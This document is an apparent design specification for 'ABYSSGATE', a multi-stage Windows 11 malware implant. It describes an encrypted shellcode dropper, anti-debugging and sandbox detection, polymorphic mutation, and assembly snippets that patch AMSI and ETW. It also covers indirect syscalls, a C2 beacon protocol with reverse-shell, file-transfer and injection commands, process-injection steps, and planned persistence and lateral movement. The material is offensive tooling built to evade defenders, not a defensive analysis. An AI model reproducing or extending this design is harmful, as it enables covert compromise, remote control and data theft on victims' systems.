# ABYSSGATE Architecture Documentation

## System Requirements

### Target Platform
- **OS:** Windows 11 25H2
- **Build:** 26200.8039 (March 21, 2026 Cumulative Update KB5085516)
- **Architecture:** x64 (AMD64)
- **Security Level:** Maximum (Defender + VBS + HVCI + CET + ASR)

### Development Environment
- **Assembler:** NASM 2.15+
- **Linker:** GoLink or MSVC link.exe
- **Debugger:** x64dbg with ScyllaHide
- **VM:** Hyper-V Gen2 with VBS enabled

## Memory Layout

```
Process Memory (Stage 0 Loaded)
├─ [0x00000000 - 0x7FFFFFFF]  User Space
│  ├─ 0x00400000: Original executable
│  ├─ 0x00xxxxxx: Stage 0 (PIC, ~1.2KB)
│  │   └─ Allocated via VirtualAlloc/Heap
│  ├─ 0x00yyyyyy: Stage 1 (RWX, ~7KB decrypted)
│  │   └─ Allocated by Stage 0 via NtAllocateVirtualMemory
│  └─ 0x00zzzzzz: Stage 2 (RWX, ~10KB decrypted)
      └─ Allocated by Stage 1 via VirtualAlloc
└─ [0x7FF00000 - 0x7FFFFFFF]  System DLLs
   ├─ 0x7FFxxxxx: ntdll.dll (base for syscalls)
   ├─ 0x7FFyyyyy: kernel32.dll (API resolution)
   └─ 0x7FFzzzzz: wininet.dll (C2 - loaded dynamically)
```

## Stage 0: Dropper Technical Details

### Entry Conditions
- Loaded via any vector (file, network, injection)
- Position independent - no fixed base address
- No imports - must resolve everything dynamically

### Execution Flow

```
_start:
    1. Save context (rbx, rsi, rdi, r12-r15)
    2. Get current RIP (call/pop technique)
    3. Calculate base address
    4. Get PEB via GS:[0x60]
    5. Walk InLoadOrderModuleList
    6. Hash each module name
    7. Find ntdll.dll by hash (0x22D3B5ED)
    8. Parse ntdll PE headers
    9. Walk export table
    10. Hash each export name
    11. Find NtAllocateVirtualMemory by hash
    12. Allocate RWX memory for Stage 1
    13. Decrypt embedded Stage 1 (ChaCha20)
    14. Jump to Stage 1 entry
```

### ChaCha20 Implementation

State initialization (64 bytes):
```
[0x00-0x0F]: Constants "expand 32-byte k"
[0x10-0x1F]: Key (32 bytes, embedded)
[0x20-0x27]: Counter (8 bytes, little-endian)
[0x28-0x2F]: Nonce (8 bytes, embedded)
```

Quarter Round Operation:
```nasm
a += b; d ^= a; d <<<= 16
c += d; b ^= c; b <<<= 12
a += b; d ^= a; d <<<= 8
c += d; b ^= c; b <<<= 7
```

20 rounds (10 double rounds) per block.

## Stage 1: Loader Technical Details

### Anti-Analysis Checks

#### 1. PEB BeingDebugged
```nasm
mov rax, gs:[0x60]          ; PEB
movzx eax, byte [rax + 0x2] ; BeingDebugged
```

#### 2. NtGlobalFlag
```nasm
mov eax, [rax + 0xBC]       ; NtGlobalFlag
and eax, 0x70               ; Check debug flags
```

#### 3. Heap Flags
```nasm
mov rax, [rax + 0x30]       ; ProcessHeap
mov edx, [rax + 0x40]       ; Flags
mov ecx, [rax + 0x44]       ; ForceFlags
test edx, 0x40000000        ; HEAP_TAIL_CHECKING
```

#### 4. Remote Debug (NtQueryInformationProcess)
```nasm
; ProcessDebugPort = 7
; Returns -1 if debugger present
```

#### 5. Hardware Breakpoints
```nasm
mov rbx, dr0
test rbx, rbx
jnz detected
; Check DR1, DR2, DR3, DR7
```

#### 6. Timing Check
```nasm
rdtsc
; ... execute code ...
rdtsc
sub rax, rbx
cmp rax, THRESHOLD
```

#### 7. CET Check
```nasm
mov rax, gs:[0x60]
test byte [rax + 0xEC], 0x1
```

#### 8. Module Detection
Hash-based detection of:
- dbghelp.dll
- sbiedll.dll (Sandboxie)
- api_log.dll (iDefense)
- dir_watch.dll (Sunbelt)

### Polymorphic Engine

When debug detected, applies transformations:

1. **Register Swapping**
   - Swap rax <-> r8, rbx <-> r9, etc.
   - Update all references

2. **Junk Code Insertion**
   ```nasm
   push rax
   pop rax
   nop
   xchg rax, rax  ; NOP equivalent
   ```

3. **Instruction Substitution**
   - `mov rax, 0` -> `xor rax, rax`
   - `add rax, 1` -> `inc rax`
   - `sub rax, 0` -> `nop`

### API Resolution (Full)

Resolves 15+ APIs by hash:
- kernel32: LoadLibraryA, GetProcAddress, VirtualAlloc, VirtualProtect, Sleep
- ntdll: NtQueryInformationProcess, NtDelayExecution
- wininet: InternetOpenA, InternetConnectA, HttpOpenRequestA, HttpSendRequestA

### AMSI Patch

```nasm
; AmsiScanBuffer normally:
;   mov r11, [rsp+8]
;   mov rax, [rsp+10]
;   ...
;   ret

; Patched to:
;   xor eax, eax  ; Return AMSI_RESULT_CLEAN (0)
;   ret
```

### ETW Patch

```nasm
; EtwEventWrite normally logs telemetry
; Patched to immediate return
mov byte [rax], 0xC3  ; ret
```

## Stage 2: Beacon Technical Details

### Indirect Syscall Implementation

**Syscall Table Structure:**
```
[0x00]: NtAllocateVirtualMemory - SSN + syscall addr
[0x10]: NtProtectVirtualMemory - SSN + syscall addr
[0x20]: NtCreateThreadEx - SSN + syscall addr
[0x30]: NtQueueApcThread - SSN + syscall addr
[0x40]: NtDelayExecution - SSN + syscall addr
...
```

**SSN Extraction:**
```nasm
; Read syscall number from function prologue
; mov r10, rcx (4 bytes)
; mov eax, SSN (5 bytes: 0xB8 + 4 bytes SSN)
mov eax, [addr + 4]  ; Extract SSN
```

**Syscall Address Finding:**
```nasm
; Search for syscall instruction pattern
; 0x0F 0x05 = syscall
; Starting from function entry + 0x12 (typical offset)
```

**Indirect Call Stub:**
```nasm
NtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, SSN
    jmp QWORD PTR [syscall_addr]  ; Jump to ntdll!syscall
```

### C2 Protocol

**Beacon Format (Encrypted):**
```
[0x00-0x07]: Session ID (8 bytes)
[0x08]: Command ID (1 byte)
[0x09-0x0C]: Data Length (4 bytes)
[0x0D...]: Data (variable)
```

**Encryption:** Rolling XOR with session key
```
key = (key << 3) | (key >> 29)  ; Rotate
encrypted[i] = plaintext[i] ^ (key & 0xFF)
```

**Jitter Calculation:**
```nasm
; Random interval between 30-120 seconds
rdtsc
and eax, 0xFFFF
mul (MAX - MIN)
shr eax, 16
add eax, MIN
```

### Command Dispatcher

| ID | Command | Handler |
|----|---------|---------|
| 0x01 | PING | beacon_checkin |
| 0x02 | EXEC | execute_command |
| 0x03 | DOWNLOAD | download_file |
| 0x04 | UPLOAD | upload_file |
| 0x05 | SHELL | reverse_shell |
| 0x06 | INJECT | inject_process |
| 0xFF | EXIT | terminate |

### Process Injection

**Method 1: CreateRemoteThread**
```
1. OpenProcess(target_pid)
2. VirtualAllocEx(RWX)
3. WriteProcessMemory(shellcode)
4. CreateRemoteThread(entry_point)
```

**Method 2: APC Injection**
```
1. OpenProcess(target_pid)
2. VirtualAllocEx(RWX)
3. WriteProcessMemory(shellcode)
4. QueueUserAPC / NtQueueApcThread
5. ResumeThread (if suspended)
```

## Security Considerations

### VBS/HVCI Compatibility

ABYSSGATE is designed to be **data-only** - it does not require:
- Kernel code execution
- Driver loading
- PTE modifications
- ROP chains

This makes it compatible with HVCI because all code execution happens in user-mode with legitimate signed code paths.

### CET Compatibility

Uses valid indirect calls through:
- Import Address Table (resolved APIs)
- Syscall instruction in ntdll (legitimate)
- No ROP gadgets or return address corruption

Shadow stack remains valid throughout execution.

## Build Artifacts

```
build/
├── abyssgate_shellcode.bin      # Final payload
├── stage0.bin                   # Raw Stage 0
├── stage1.bin                   # Raw Stage 1
├── stage2.bin                   # Raw Stage 2
├── stage1_enc.bin               # Encrypted Stage 1
├── stage2_enc.bin               # Encrypted Stage 2
├── test_loader.c                # C test harness
├── test_loader.exe              # Compiled harness
└── *.lst                        # NASM listings

variants/
├── abyssgate_v1.bin             # Variant 1 (regs swapped)
├── abyssgate_v2.bin             # Variant 2 (junk code)
├── abyssgate_v3.bin             # Variant 3 (reordered)
├── abyssgate_v4.bin             # Variant 4 (mixed)
└── abyssgate_v5.bin             # Variant 5 (heavy mutation)
```

## Performance Metrics

| Metric | Value |
|--------|-------|
| Total Size | ~18KB (compressed/encrypted) |
| Stage 0 Size | ~1.2KB |
| Stage 1 Size | ~7KB |
| Stage 2 Size | ~10KB |
| Startup Time | <100ms (typical VM) |
| Memory Footprint | ~32KB (all stages) |
| C2 Interval | 30-120s (jittered) |
| Encryption Overhead | ~5% |
| API Resolution Time | ~10ms |

## Detection Evasion Summary

### Static Analysis
- No strings (all hashed)
- No imports (resolved at runtime)
- Encrypted payloads
- Polymorphic mutations

### Dynamic Analysis
- Anti-debug checks
- Timing evasion
- Hardware BP detection
- Debugger module detection

### Behavioral Detection
- Indirect syscalls (no syscall instruction in payload)
- Legitimate API call chains during sleep
- Jittered beaconing
- AMSI/ETW disabled

### Memory Forensics
- Position independent (no fixed signatures)
- Self-modifying (polymorphic)
- No RWX regions after initial load (can transition to RX)

## Future Enhancements

Potential additions for future versions:

1. **Hardware-backed Keys**
   - Use TPM for key storage
   - Bind to specific machine

2. **Domain Fronting**
   - C2 via CDN
   - Bypass domain blacklisting

3. **Steganography**
   - Hide C2 in images
   - DNS tunneling

4. **Lateral Movement**
   - SMB pipe execution
   - WMI event subscription

5. **Persistence**
   - Registry run keys
   - Scheduled tasks
   - Service creation
